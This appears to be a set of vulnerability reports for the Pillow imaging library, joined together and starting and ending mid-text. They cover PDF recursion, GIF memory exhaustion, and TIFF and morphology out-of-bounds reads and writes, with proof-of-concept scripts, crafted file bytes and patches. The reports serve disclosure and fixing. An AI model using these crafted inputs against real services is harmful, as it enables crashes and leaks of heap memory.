" + "=" * 64)     if baseline_ok and attack_confirmed:         print("VERDICT: PASS")         print("  Normal schema  : returned in under 1 s")         print(f"  Circular $ref  : still running after {TIMEOUT_SECONDS}s (killed)")         print("  Conclusion: resolve_schema() enters an unbounded loop on circular $ref.")         return 0     elif not attack_confirmed:         print("VERDICT: FAIL — circular $ref did not cause an infinite loop")         print("  The library may already be patched in this build.")         return 2     else:         print("VERDICT: FAIL — baseline test failed; check the environment")         return 3   if __name__ == "__main__":     sys.exit(main()) ```

### Summary When an application appends to an existing PDF with `Image.save(..., format="PDF", append=True)`, Pillow parses that file with `PdfParser`. Two recursive parsers have no effective bound. `linearize_page_tree` follows `/Kids` with no visited set or depth limit, so a cyclic or duplicated page tree recurses without end. `read_prev_trailer` rejects only an exactly repeated `/Prev` offset, so a long chain of unique offsets still recurses. The trailer-loop guard added for CVE-2026-42310 does not cover either case.  ### Details `linearize_page_tree` recurses on `/Kids` with no cycle or depth check:  - `src/PIL/PdfParser.py:1078-1092`  `read_prev_trailer` catches only a repeated offset:  - `src/PIL/PdfParser.py:697-720` (the `processed_offsets` check at `:714-718` is the CVE-2026-42310 fix; a unique-offset chain slips past it)  ### PoC ```python from PIL import PdfParser  # A page tree whose /Pages nodes reference each other in a cycle (2 -> 3 -> 2). objs = {     1: b"<< /Type /Catalog /Pages 2 0 R >>",     2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",     3: b"<< /Type /Pages /Kids [2 0 R] /Count 1 >>", } buf = bytearray(b"%PDF-1.4
") off = {} for oid in (1, 2, 3):     off[oid] = len(buf)     buf += b"%d 0 obj
" % oid + objs[oid] + b"
endobj
" xref = len(buf) buf += b"xref
0 4
0000000000 65535 f 
" buf += b"".join(b"%010d 00000 n 
" % off[o] for o in (1, 2, 3)) buf += b"trailer
<< /Root 1 0 R /Size 4 >>
startxref
%d
%%%%EOF
" % xref open("poc.pdf", "wb").write(buf)  PdfParser.PdfParser("poc.pdf", mode="r+b")   # append=True parses the existing file the same way ```  Run it: ``` $ python 11_poc.py RecursionError: maximum recursion depth exceeded ```  The 315-byte file triggers the recursion on parse. A duplicated (non-cyclic) `/Kids` tree instead produces super-linear CPU and memory work, and a long unique-offset `/Prev` chain triggers the trailer-side recursion.  ### Impact A service that appends to user-supplied PDFs, for example a stamping or watermarking pipeline, can be driven into uncaught recursion or heavy CPU and memory use before any image is written. Follow-up to CVE-2026-42310. Since Pillow's policy discourages filing plain Python exceptions as denial of service, lead with the cyclic-tree case, which burns CPU and memory rather than only raising `RecursionError`. The fix is a visited set plus a depth limit in both parsers.

``` ============================================================================ GIF seek keeps rejected size after DecompressionBombError, allowing DoS Location: src/PIL/GifImagePlugin.py:293 in GifImageFile._seek() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A GIF of about 60 bytes can make Pillow allocate gigabytes of memory. This affects applications that catch the "image too large" error raised while stepping to a later animation frame and then keep using the same image object. Pillow correctly refuses the oversized frame, but it stores the refused dimensions on the image object anyway, and later operations size their memory from them. An attacker who can upload a GIF to such a service can exhaust its memory: the process either fails with an out-of-memory error after committing gigabytes, or is killed by the operating system. There is no memory corruption. The bug is in `GifImageFile._seek()` (`src/PIL/GifImagePlugin.py:292-294`). When a frame's extent enlarges the image, the code assigns the new size to `self._size` and only then calls `Image._decompression_bomb_check()`. Nothing restores the old size when `DecompressionBombError` is raised, because `seek()` only rolls back on `EOFError`. After the caught error, `im.size` reports the rejected size while the pixel buffer `im.im` is still the 1×1 first frame. Because the extent is a 16-bit offset plus a 16-bit size, that rejected size can be as large as 131070×131070. In the attached reproducer, the rejected size is 40000×40000. A retried `seek(1)` followed by `load()` then reaches `load_prepare()`, which calls `Image.core.fill()` with that size to decode a single pixel. Peak memory rises from 17 MiB to 1700 MiB before a 3 GiB address-space cap stops the next allocation. `Image.new("RGB", im.size, ...)` and `rotate(..., expand=True)` also allocate from the stale size. The default paths are unaffected: plain `Image.open()` plus `load()`, `ImageSequence.Iterator`, and `n_frames`/`is_animated`. The ordering was introduced in c9f1b35e9810 ("Added GIF decompression bomb check", 2022-06-30, first released in 9.2.0), the check added for CVE-2022-45198. The two dispose-extent checks later in the same function already validate before using the size, and the attached patch makes this check follow the same order. ## Details `GifImageFile._seek()` lets a later frame enlarge the image, and performs the decompression-bomb check for the new size only *after* storing it on the object: ```python # src/PIL/GifImagePlugin.py:289-294 (GifImageFile._seek) x0, y0 = i16(s, 0), i16(s, 2) x1, y1 = x0 + i16(s, 4), y0 + i16(s, 6) if (x1 > self.size[0] or y1 > self.size[1]) and update_image: self._size = max(x1, self.size[0]), max(y1, self.size[1]) # state mutated Image._decompression_bomb_check(self._size) # ...then validated ``` `_decompression_bomb_check()` (`src/PIL/Image.py:3586`) raises `DecompressionBombError` for anything above `2 * MAX_IMAGE_PIXELS` (178 956 970 px by default), but by then `self._size` already holds the rejected value and nothing restores it: `seek()` (`GifImagePlugin.py:166-179`) only rolls back on `EOFError`, and `_seek(0)` only ever grows `_size`. The object that the application still holds therefore reports `im.size == (40000, 40000)` while `im.im` is the 1×1 buffer of frame 0. Compare the two dispose-extent checks a few lines further down in the same function (`GifImagePlugin.py:383` and `:407`), which call `_decompression_bomb_check(dispose_size)` *before* the corresponding `Image.core.fill()`, and `TiffImagePlugin.load_prepare()` (`src/PIL/TiffImagePlugin.py:1319-1321`), which checks `_tile_size` before allocating from it. With this 60-byte GIF (hex) ``` 47494638396101000100800000000000ffffff GIF89a, 1x1 screen, 2-entry global palette 2c000000000100010000 02 024401 00 frame 0: 1x1 @ (0,0), LZW data 2c00000000409c409c00 frame 1 descriptor: 40000x40000 @ (0,0) 2c000000000100010000 02 024401 00 another 1x1 frame 3b trailer ``` `Image.open()` succeeds (`im.size == (1, 1)`), `im.seek(1)` raises `DecompressionBombError: Image size (1600000000 pixels) exceeds limit of 178956970 pixels`, and afterwards `im.size == (40000, 40000)`, `im.im.size == (1, 1)`, `im.tell() == 0`. What happens next depends on what the application does with the object, but several ordinary operations take their dimensions from `im.size` rather than from the C buffer: - Retrying `im.seek(1)`. The failed `_seek` left `self.__offset == 0` and the file pointer just past the 9-byte descriptor, so the retry parses whatever follows — in the file above, a valid 1×1 frame — and succeeds. `im.load()` then runs `GifImageFile.load_prepare()`: ```python # src/PIL/GifImagePlugin.py:452-456 elif self.mode in ("RGB", "RGBA"): self._prev_im = self.im if self._frame_palette: self.im = Image.core.fill("P", self.size, self._frame_transparency or 0) ``` which allocates and `memset`s a 40000×40000 "P" image (1.6 GB) to decode a 1×1 tile into, and `load_end()` (`GifImagePlugin.py:485-491`) fills a second one and converts it to RGB (another 1.6 GB + 6.4 GB). - `im.rotate(angle, expand=True)` for a non-multiple-of-90 angle, or the common flatten-onto-background idiom `Image.new("RGB", im.size, bg)`, allocate from `im.size` as well (measured on an object poisoned to 20000×20000: `rotate(45, expand=True)` completes and touches 776 MiB; `Image.new("RGB", im.size, "white")` touches 1.5 GiB). Operations that pass `im.size` as a box against the real buffer (`thumbnail`, `resize`, `save`) fail with `ValueError`/`SystemError` instead. The extent fields are 16-bit offset plus 16-bit size, so the stored size can be pushed to 131070×131070 (17.2 Gpx; 17 GB for mode "P", 69 GB for "RGB"/"RGBA" storage), 96× the error threshold. `n_frames` / `is_animated` are not affected: they call `_seek(frame, update_image=False)`, which skips the `_size` assignment (the file above reports `n_frames == 2`, `is_animated == True` and leaves `im.size` at 1×1). ## Impact A remote user who can upload a GIF to a service that (a) seeks animation frames and (b) catches the exception from `seek()` — a broad `except Exception` around a `while True: im.seek(im.tell()+1)` frame-collection loop, or an explicit `except DecompressionBombError: log and continue` — and then keeps using the same `Image` object, ends up driving allocations of 1.6 GB to tens of GB from a 60-byte file: `MemoryError` after the process has committed gigabytes, or an OOM kill of the worker when no address-space limit is set. The `MAX_IMAGE_PIXELS` guard fires, but does not actually keep the rejected dimensions out of the object it is guarding. The precondition is real application behaviour but not the default path: `Image.open(); im.load()` is unaffected, and `ImageSequence.Iterator` propagates the error out of the `for` statement (a `try` inside the loop body does not swallow it). Hence low severity. This is adjacent to the GIF extent bomb check added for CVE-2022-45198: the ordering was introduced with that check in `c9f1b35e9810` ("Added GIF decompression bomb check", 2022-06-30), first released in Pillow 9.2.0. Before it, the same size growth happened with no check at all; the check introduced there is the one that runs too late. ## Reproducing `repro` is a single Python script run against the installed Pillow. It needs about 1.7 GB of free RAM. 1. **`setup_env()`** caps the process address space at 3 GiB with `RLIMIT_AS`, so the oversized allocations end in `MemoryError` instead of the OOM killer. It then opens the 60-byte GIF shown above, built in memory by `bomb_gif()`. The GIF contains a 1×1 screen and a 1×1 frame 0, so `Image.open()` passes its own bomb check. Next comes a bare frame-1 image descriptor that declares 40000×40000 (1.6 Gpx, about 9× the error threshold). A real 1×1 frame follows it. 2. **`poc()`** calls `im.seek(1)` and catches `DecompressionBombError`, the way an application that skips bad frames would. 3. **First check: the state is inconsistent.** The script prints `im.size` next to the real pixel buffer `im.im.size`. If the rejected frame had left the object unchanged, both would be `(1, 1)`. On the affected code `im.size` is `(40000, 40000)`. 4. **Second check: memory use.** The script retries `im.seek(1)`, which now parses the trailing 1×1 frame, and calls `im.load()`. It prints the process's peak RSS before and after. `load_prepare()` sizes its `Image.core.fill()` from `im.size`, so loading a single pixel fills a 1.6 GB buffer before the 3 GiB cap stops the next allocation. Expected output on the affected tree: ``` open(): 60-byte GIF, size=(1, 1) seek(1) raised as intended: Image size (1600000000 pixels) exceeds limit of 178956970 pixels, could be decompression bomb DOS attack. after the caught error: im.size=(40000, 40000), pixel buffer im.im.size=(1, 1) seek(1) + load() of a 1x1 frame: MemoryError at the 3 GiB cap; peak RSS 18 MiB -> 1700 MiB BUG ``` The script prints `BUG` only if both checks hold: the over-limit size stayed on the object after the exception, and peak RSS grew by more than 1000 MiB while loading a 1×1 frame. Otherwise it prints `OK`. With the attached patch applied, it prints `im.size=(1, 1)`, peak RSS stays at about 23 MiB, and the last line is `OK`. ## Suggested fix The attached patch validates before mutating in `GifImageFile._seek()` (`src/PIL/GifImagePlugin.py:292-294`): the enlarged extent is computed into a local, passed to `_decompression_bomb_check()`, and only then assigned to `self._size`, matching the order of the two `dispose_size` checks further down the same function. A rejected frame therefore leaves the object in its pre-seek state; valid files behave as before, and the exception is still raised at the same point: ```diff --- a/src/PIL/GifImagePlugin.py +++ b/src/PIL/GifImagePlugin.py @@ -290,8 +290,9 @@ class GifImageFile(ImageFile.ImageFile): x0, y0 = i16(s, 0), i16(s, 2) x1, y1 = x0 + i16(s, 4), y0 + i16(s, 6) if (x1 > self.size[0] or y1 > self.size[1]) and update_image: - self._size = max(x1, self.size[0]), max(y1, self.size[1]) - Image._decompression_bomb_check(self._size) + size = max(x1, self.size[0]), max(y1, self.size[1]) + Image._decompression_bomb_check(size) + self._size = size frame_dispose_extent = x0, y0, x1, y1 flags = s[8] ``` `n_frames` / `is_animated` go through `update_image=False` and are unaffected. ### Summary A PPM or PGM file can declare a width of 0, which Pillow accepts, producing an image of size `(0, N)`. Passing that image to `ImageMorph.MorphOp.apply()` makes the native morphology code index a row buffer at `outrow[width - 1]`, which is `outrow[-1]` when the width is 0. The process crashes.  ### Details The PPM parser reads width and height with no lower-bound check:  - `src/PIL/PpmImagePlugin.py:119`  The native `apply()` writes the row edges with no guard that the width is positive:  - `src/_imagingmorph.c:81` sets `outrow[0] = outrow[width - 1] = 0;`  `match()` and `get_on_pixels()` use the same edge-indexing pattern.  ### PoC ```python from PIL import Image, ImageMorph  # A width-0 image (also producible from a crafted PPM header). apply() indexes # outrow[width - 1] == outrow[-1] in native code. im = Image.new("L", (0, 5)) ImageMorph.MorphOp(op_name="dilation4").apply(im) ```  Run it: ``` $ python 03_poc.py Segmentation fault (core dumped) ```  Observed on a source build of commit `3e2ab96`.  Under AddressSanitizer: ``` ==ERROR: AddressSanitizer: SEGV on unknown address (pc ... in apply)     #0 apply   src/_imagingmorph.c:81 SUMMARY: AddressSanitizer: SEGV src/_imagingmorph.c:81 in apply ``` With width 0 the `outrow[width - 1]` write lands on an unmapped page, so it surfaces as a SEGV pinned to the edge-write line rather than a redzone overflow.  ### Impact Out-of-bounds write in a C extension. Affects any application that runs a morphology operation on an image opened from untrusted input. Result is a crash and possible memory corruption.

## Summary  A small attacker-supplied TIFF can be opened and loaded normally, then reach an out-of-bounds read when an application saves it back to TIFF with retained metadata. The fixed reproducer is a 1×1, 16-bit grayscale, PackBits-compressed TIFF containing tag 320 (ColorMap) with **768 SHORT values**: three zero-filled planes of 256 entries each. No Python object is forged and no metadata is injected after loading.  Pillow's TIFF encoder allocates **768 × 2 = 1536 bytes**, then passes three plane pointers separated by 256 SHORT entries to libtiff. With `BitsPerSample = 16`, libtiff instead expects **65536 SHORT values per plane** and attempts a **131072-byte read** from a plane pointer. Existing ASAN observations identify a heap-buffer-overflow READ crossing the 1536-byte allocation made in `PyImaging_LibTiffEncoderNew`.  The malformed ColorMap need not be a valid palette for this grayscale image. The issue is that accepted metadata is forwarded on save without reconciling the fixed plane extent with the effective sample depth. Opening/loading alone is not the demonstrated fault; the encoder path is required.  ## Impact and prerequisites  An application must accept the input, retain the relevant TIFF metadata, and invoke the libtiff-backed TIFF save path. The observed consequence is an out-of-bounds read and ASAN termination. Process-memory exposure during encoding is a potential consequence, **not demonstrated by extracting arbitrary heap contents in this report**. No arbitrary read primitive, full memory-disclosure chain, code execution, address-space bypass, or cross-process effect is claimed.  The 131072-byte attempted copy is not the number of bytes proven disclosed. This report does not run a synthetic-canary serializer or collect an unsanitized encoded output.  ## Tested environment and limits of the evidence  The existing observations were recorded on August 30, 2026, with **CPython 3.11.8 on macOS ARM64**, using the unmodified official **Pillow 12.3.0** wheel and its bundled **libtiff 4.7.1**:  - Wheel: `pillow-12.3.0-cp311-cp311-macosx_11_0_arm64.whl` - Wheel size: `4785266` bytes - Wheel SHA-256: `37d6d0a00072fd2948eb22bce7e1475f34569d90c87c59f7a2ec59541b77f7a6` - Pillow source revision: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d` - Bundled libtiff SHA-256: `e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1`  Apple's ASAN runtime was injected at process startup. This is **not an ASAN-rebuilt Pillow wheel**; allocation/memcpy interception detects the reported boundary violation, but the wheel's native instructions are not comprehensively instrumented.  Only this concrete full-package environment is established here. No affected-version range, current development-branch result, or patched release is asserted. Severity is **Unknown**; no CVSS score is proposed.  Separate earlier evidence reached the original Pillow 8.0.1 encoder constructor compiled as a component against a modern Python/libtiff environment. **That was not a complete Pillow 8.0.1 installation** and does not establish the historical package's full runtime behavior. It is not part of this reproducer or an affected-version range.  ## Observed evidence and controls  The earlier integration harness performed the natural sequence `Image.open(BytesIO(input))`, `image.load()`, then `image.save(BytesIO(), format="TIFF")`, without replacing the image's metadata. Each case was recorded three times:  | Original fixture | Bytes | Recorded result | | --- | ---: | --- | | `colormap16` | 1685 | Loaded as `I;16`; save terminated with ASAN exit 86, READ of size 131072 crossing a 1536-byte heap region (3/3). | | `colormap8` | 1684 | Same fixed ColorMap, but 8-bit samples; save succeeded and retained SHORT/count 768 (3/3). | | `colormap_absent` | 137 | Same 16-bit geometry without ColorMap; save succeeded (3/3). |  Address-free summary of the recorded native diagnostic:  ```text AddressSanitizer: heap-buffer-overflow READ of size 131072 0 bytes after 1536-byte region Copy path: memcpy -> _TIFFmemcpy -> setByteArray -> _TIFFsetShortArrayExt            -> _TIFFVSetField -> TIFFVSetField -> ImagingLibTiffSetField            -> PyImaging_LibTiffEncoderNew Allocation: calloc -> PyImaging_LibTiffEncoderNew ```  Input SHA-256 values (also enforced inside the script):  - `colormap16`: `5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d` - `colormap8`: `fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c` - `colormap_absent`: `bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556`  ## Root cause and source references  - [Pillow `src/encode.c`, lines 870–899, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/encode.c#L870): the ColorMap tuple must contain exactly 768 entries; a 1536-byte allocation is passed with a fixed stride of 256. The check does not reconcile that extent with `BitsPerSample`. - [Pillow `src/PIL/TiffImagePlugin.py`, lines 1944–1991, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/PIL/TiffImagePlugin.py#L1944): save carries supplied tags into the libtiff encoder and sorts the tags, so sample depth is established before ColorMap. - [libtiff `tif_dir.c`, lines 441–448, pinned revision](https://gitlab.com/libtiff/libtiff/-/blob/5fe20d0e9aba49a6a350ed533459d1505203838f/libtiff/tif_dir.c#L441): `TIFFTAG_COLORMAP` computes the per-plane count as `1L << td->td_bitspersample` and copies that many SHORTs from each pointer.  The reported boundary is Pillow's construction of a fixed-sized array for a native API whose required size depends on metadata; this does not establish a standalone libtiff defect for a correctly sized caller buffer.  ## Prior art and disclosure scope  [Pillow PR #5148](https://github.com/python-pillow/Pillow/pull/5148), merged December 28, 2020, is related TIFF metadata prior art, but its archived diff replaces a short-lived stack field-name pointer with the persistent literal `"CustomField"`. That is a **different field-name-lifetime fix**, not this plane-size mismatch. The reviewed material does not establish an exact prior public report or fix for this root, and **novelty is not asserted**. This specific report remains NOT_SENT; association with other observations is not a prior disclosure of it.  ## Reproduction instructions  Use an **already reviewed, existing** installation of the exact wheel above, an existing compatible macOS ARM64 CPython 3.11 interpreter, and an existing compatible Apple ASAN runtime. `--package-path` is the absolute directory containing `PIL`, not the `PIL` directory itself. ``` ============================================================================ TiffDecode returns uninitialized memory as pixels for short JPEG strips Location: src/libImaging/TiffDecode.c:554 in _decodeStrip() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Pillow hands back leftover process memory as image pixels when it opens a small crafted TIFF file. Anyone who can get an application to open their image, and can see something produced from its pixels (a thumbnail, a preview, a converted copy), can read heap memory that the process had previously used and freed. This works in the default configuration: opening and loading the 478-byte file succeeds with no error or warning, and every row below the first eight holds stale memory instead of picture content. The bug is in `_decodeStrip()` in `src/libImaging/TiffDecode.c`, and `_decodeTile()` has the same shape. The function `realloc()`s `state->buffer` to `TIFFStripSize()` bytes without initialising it and calls `TIFFReadEncodedStrip()`. Whenever that call does not return -1, it copies all `RowsPerStrip` rows of the buffer into the image. libtiff's JPEG codec only warns when the JPEG embedded in a strip has fewer rows than the strip, and Pillow silences libtiff warnings. The codec decodes the rows that exist and still returns the full strip size, so the untouched remainder is copied out as pixels. libtiff's Group 4 fax codec behaves the same way for a stream that ends early. The attached reproducer builds a 256×256 TIFF whose single strip or tile is a 256×8 JPEG. Before loading it, the script frees buffers filled with `b"LEAK"`. It then finds 15,872 copies of `LEAK` in rows 8–255 of the decoded image (the same freed chunk was reused in 500 of 500 runs). Under glibc's `MALLOC_PERTURB_`, those rows are entirely the allocator's fill byte. A well-formed control file decodes correctly in both cases. This is a read of uninitialised heap memory, not memory corruption. Each strip can disclose up to width × `RowsPerStrip` bytes, and what comes back depends on the allocator's state at the time. The strip path was introduced in e91b851fdc1c ("Add reading old-JPEG compressed TIFFs", first released in Pillow 6.0.0). The tile path has had the same pattern since f0436a4ddc95 (Pillow 5.3.0). ## Details `src/libImaging/TiffDecode.c` decodes compressed TIFFs through libtiff into a strip (or tile) buffer that it `realloc()`s to `TIFFStripSize()` bytes and never initialises, and then copies all `RowsPerStrip` rows of that buffer into the image whenever `TIFFReadEncodedStrip()` does not return -1. libtiff's JPEG codec does not fail when the JPEG stream inside a strip has fewer rows than the strip: it decodes the rows that exist and returns the full strip size. The rows it did not write are whatever the heap held before, and Pillow returns them as pixels. A 478-byte file shows it: a classic little-endian TIFF, 256×256, `BitsPerSample=8`, `Compression=7`, `PhotometricInterpretation=1`, `RowsPerStrip=256`, one strip whose data is a baseline JPEG of 256×**8** pixels (as written by `Image.new("L",(256,8),200).save(…,"JPEG")`). `Image.open(BytesIO(data)).load()` succeeds with default settings (compressed TIFFs always take the libtiff path). Rows 0–7 of the result are the JPEG content (value 200); the remaining 63488 bytes of `im.tobytes()` are heap garbage: run under glibc's `MALLOC_PERTURB_=1` they are all `0xFE`, under `MALLOC_PERTURB_=170` all `0x55` (the fresh-`malloc` fill byte), and in a process that has just freed buffers containing `b"LEAK"` they contain 15872 copies of `LEAK`. Feeding the same file to libtiff 4.5.0 directly confirms the library side: `TIFFReadEncodedStrip(t, 0, buf, 65536)` prints `JPEGPreDecode: Warning, Improper JPEG strip/tile size, expected 256x256, got 256x8.`, returns 65536, and leaves 63488 of the 65536 buffer bytes untouched. Pillow installs `TIFFSetWarningHandler(NULL)` (`TiffDecode.c:682`), so the warning is not visible either. The strip path: ```c // src/libImaging/TiffDecode.c:552 /* realloc to fit whole strip */ /* malloc check above */ new_data = realloc(state->buffer, state->bytes); // state->bytes = TIFFStripSize() … state->buffer = new_data; for (; state->y < state->ysize; state->y += rows_per_strip) { … if (TIFFReadEncodedStrip( tiff, TIFFComputeStrip(tiff, state->y, plane), (tdata_t)state->buffer, strip_size ) == -1) { … return -1; } … // iterate over each row in the strip and stuff data into image for (strip_row = 0; strip_row < MIN((INT32)rows_per_strip, state->ysize - state->y); strip_row++) { … shuffler( (UINT8 *)im->image[state->y + state->yoff + strip_row] + state->xoff * im->pixelsize, state->buffer + strip_row * row_byte_size, state->xsize ); ``` `state->buffer` arrives here as the one-row `calloc` made by `decode.c:230` (`(bits*xsize+7)/8` = 256 bytes for the example). The `realloc` to 65536 bytes hands back a different, uninitialised chunk; nothing zeroes it. `TIFFReadEncodedStrip()` returns the nominal strip size on success, not the number of rows produced, and the only check is `== -1`, so the row loop unconditionally copies 256 rows × 256 bytes into `im->image` (which itself is zeroed by `core.new`, so the garbage provably comes from `state->buffer`). `_decodeTile()` has the same shape (`TiffDecode.c:448` `realloc` to `TIFFTileSize()`, then `tile_length` rows copied after each `TIFFReadTile()` at 460–488). For a well-formed file the JPEG inside the strip is 256×256, libtiff fills all 65536 bytes and the copy is correct. The malicious file differs only in the SOF height of the embedded JPEG; libtiff treats "JPEG smaller than strip" as a warning, clamps the row count to the JPEG height, and reports success. JPEG is not the only libtiff codec that succeeds on a short strip. `Fax4Decode` (`Compression=4`) returns success for a T.6 stream that ends early: a 133-byte 512×256 1-bit TIFF whose strip is the Group 4 stream of a 512×16 image loads without error, libtiff writes 17 rows (1088 bytes) of the 16384-byte buffer (`Fax4Decode: Warning, Premature EOL at line 16`, return value 16384) and the other 15296 bytes are again heap contents. LZW, Deflate, PackBits, Group 3 and CCITT RLE were checked and do return -1 on short data, so Pillow raises `OSError` for those. The strip path was introduced in `e91b851fdc1c` ("Add reading old-JPEG compressed TIFFs", 2018-12-08), first released in Pillow 6.0.0, which replaced row-by-row `TIFFReadScanline()` (where libtiff errors on the first missing row) with the whole-strip `realloc()` and copy. The tile path has had the same shape since it was added in `f0436a4ddc95` (2018-07-02, Pillow 5.3.0). ## Impact Any application that opens attacker-supplied images with Pillow in the default configuration and returns something derived from the pixels (thumbnail, preview, format conversion, OCR text) discloses freed heap memory of the worker process to the uploader: everything below the rows the embedded JPEG/G4 stream actually encodes, up to `ImageWidth × RowsPerStrip × SamplesPerPixel` bytes per strip and tens of MB per image within the default `MAX_IMAGE_PIXELS`. `load()` raises nothing, so the application has no signal that the image is malformed. What comes back depends on allocator state; in a long-running web worker it is typically recently freed request bodies, other users' decoded image buffers and Python object contents. There is no memory corruption; this is a read of uninitialised (previously used) heap memory, analogous in effect to an out-of-bounds read that lands in pixels. ## Reproducing `repro` is a short Python script that runs against the installed Pillow build with default settings: no rebuild, no sanitizer, no files written. It runs twice, once normally and once re-executing itself under glibc's `MALLOC_PERTURB_=170`, and the last line it prints is `BUG` or `OK`. **Input.** `tiff(jpeg_rows, tiled)` builds a little-endian TIFF in memory. The header declares a 256×256 8-bit greyscale image with `Compression=7` (JPEG), either as one strip (`RowsPerStrip=256`) or as one 256×256 tile (`TileWidth`/`TileLength`). The strip or tile is a baseline JPEG of 256×`jpeg_rows` pixels, all value 200, written by Pillow's own JPEG encoder. For each layout the script builds two files: - **Control:** `jpeg_rows=256`. This is a well-formed file, and libtiff fills the whole 64 KiB strip/tile. - **Crafted:** `jpeg_rows=8`, 478 bytes (strip) or 490 bytes (tile). ### Summary  Pillow's libImaging `_decodeTile` decoder, used to decode tiled TIFF images, allocates a per-tile buffer using `realloc(state->buffer, TIFFTileSize(tiff))`. After each `TIFFReadTile` it then iterates `tile_y` from 0 up to `current_tile_length` and calls the configured row unpacker (here `copy4`) with the source pointer `state->buffer + tile_y * row_byte_size`. When libtiff returns a `tile_bytes_size` smaller than the worst-case `row_byte_size * tile_length`, the inner stride-and-copy loop walks past the realloc'd region and `copy4` performs a 1024-byte `memcpy` that reads up to `(tile_length-1) * row_byte_size + row_byte_size` bytes from a buffer sized only to `tile_bytes_size`. The supplied PoC TIFF triggers a 1024-byte over-read exactly 0 bytes past a 196608-byte allocation. An attacker who can convince a Pillow-using application to decode a crafted TIFF can trigger a process crash (DoS) and may cause adjacent heap memory to be copied into the decoded pixel buffer.  ### Details  Pillow's TIFF decoder, when libtiff reports the file is tiled, takes the `_decodeTile` path. The function:  1. Asks libtiff for `TIFFTileSize(tiff)` (the bytes-per-tile) and `TIFFTileRowSize(tiff)` (the bytes per row *as stored by libtiff*). 2. Reallocates `state->buffer` to exactly `tile_bytes_size`. 3. For each tile origin `(x, y)` and each plane, calls `TIFFReadTile` into `state->buffer`, then walks the tile row by row, calling the configured `ImagingShuffler` (here `copy4`) on each row's worth of source bytes.  The validation done before the loop is:  ```c if (tile_bytes_size > ((tile_length * state->bits / planes + 7) / 8) * tile_width) {     state->errcode = IMAGING_CODEC_BROKEN;     return -1; } ```  This rejects oversized libtiff tiles, but it does **not** reject *undersized* ones — i.e. the case where libtiff returns a `tile_bytes_size` strictly **less** than `row_byte_size * tile_length`. The loop body, however, indexes into the buffer assuming the buffer is at least `row_byte_size * tile_length` bytes long.  ### Vulnerable Code  ```c // src/libImaging/TiffDecode.c:446-490 — _decodeTile new_data = realloc(state->buffer, state->bytes);   // bytes = tile_bytes_size if (!new_data) { ... } state->buffer = new_data;  for (y = state->yoff; y < state->ysize; y += tile_length) {     for (plane = 0; plane < planes; plane++) {         ImagingShuffler shuffler = unpackers[plane];         for (x = state->xoff; x < state->xsize; x += tile_width) {             if (TIFFReadTile(tiff, (tdata_t)state->buffer, x, y, 0, plane) == -1) { ... }              current_tile_width  = min((INT32)tile_width,  state->xsize - x);             current_tile_length = min((INT32)tile_length, state->ysize - y);             for (tile_y = 0; tile_y < current_tile_length; tile_y++) {                 shuffler(                     (UINT8 *)im->image[tile_y + y] + x * im->pixelsize,                     state->buffer + tile_y * row_byte_size,   // <-- OOB stride                     current_tile_width                 );             }         }     } } ```  ```c // src/libImaging/Unpack.c:1288-1291 — copy4 (the crash site) static void copy4(UINT8 *out, const UINT8 *in, int pixels) {     /* RGBA, CMYK quadruples */     memcpy(out, in, 4 * pixels);   // <-- ASAN-detected READ here } ```  The PoC's tile metadata yields `tile_width = tile_length = 256`, `row_byte_size = 1024` (4 bytes/pixel × 256 pixels), and `tile_bytes_size = 196608` (which is 256·256·3 = three-channel-byte storage). The realloc'd buffer is 196608 bytes. The unpacker iterates `tile_y` from 0 to 255 and for the highest rows the source pointer `state->buffer + tile_y * 1024` already lies at or past offset 196608 — the very last row's `memcpy(in=buffer+255·1024, 1024)` reads 1024 bytes starting `260096 - 196608 = 63488` bytes past the allocation; ASAN flags the very first byte past the heap region (`READ of size 1024 at … 0 bytes after 196608-byte region`).  The mismatch is real: libtiff's `TIFFTileSize` returns the *packed* per-tile storage (which depends on the file's photometric/separation layout — it can legitimately be smaller than `row_byte_size × tile_length`), while the inner loop strides as if the buffer always equals `row_byte_size × tile_length`.   ## Attribution  This issue was found by Anthropic from using Claude to study security of open source projects, and I am from Ada Logics helping validate the found issues and report to maintainers. The data in this report has been reviewed manually.

``` ============================================================================ OOB read in TiffDecode.c tile and RGBA paths leaks heap memory into pixels Location: src/libImaging/TiffDecode.c:483  in _decodeTile() Commit:   a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ```  Pillow reads past the end of a heap buffer when decoding certain malformed compressed TIFF files, and copies the bytes it reads into the pixels of the image it returns. An attacker who can get an application to open and load an image file, for example by uploading it to a service that returns thumbnails, previews or converted images, gets back fragments of that process's heap memory, including pointer values. A slightly larger file instead crashes the process. No special settings are needed, and nothing is written out of bounds.  The bug is in `_decodeTile()` and `_decodeAsRGBA()` in `src/libImaging/TiffDecode.c`. Both size their decode buffer from libtiff's view of the pixel layout (`TIFFTileSize()`/`TIFFTileRowSize()`, or `img.width * 4`). They then unpack each row with the unpacker that `TiffImagePlugin._setup()` chose from Pillow's own parse of the directory, and neither checks that the unpacker's input row fits inside the row libtiff produced. `_decodeStrip()` has exactly this check, added for OSS-Fuzz `crash-0da0` in 8.2.0, but the tile and RGBA paths never got it.  The two parsers can be made to disagree with a duplicated `PhotometricInterpretation` or `BitsPerSample` tag, because libtiff keeps the first occurrence and Pillow keeps the last. Pillow then unpacks 4 to 8 bytes per pixel from rows that libtiff filled with 1 to 4 bytes, so the last rows of each tile are read from beyond the buffer. The disclosed memory is a few tile rows past the buffer, and the attacker chooses the tile width. The amount does not grow with the number of tiles, because the buffer is reused for every tile.  The tile half was introduced in 1c295bf43 (first released in 8.2.0). The RGBA half was introduced in eb8c1206d, the CVE-2020-35654 fix (8.1.0).  The attached reproducer runs against an unmodified build. It writes three roughly 400-byte files that load without error, yet the last pixel rows of each change with glibc's malloc fill pattern and contain heap pointer bytes. A fourth file with a 65536x16 tile segfaults in 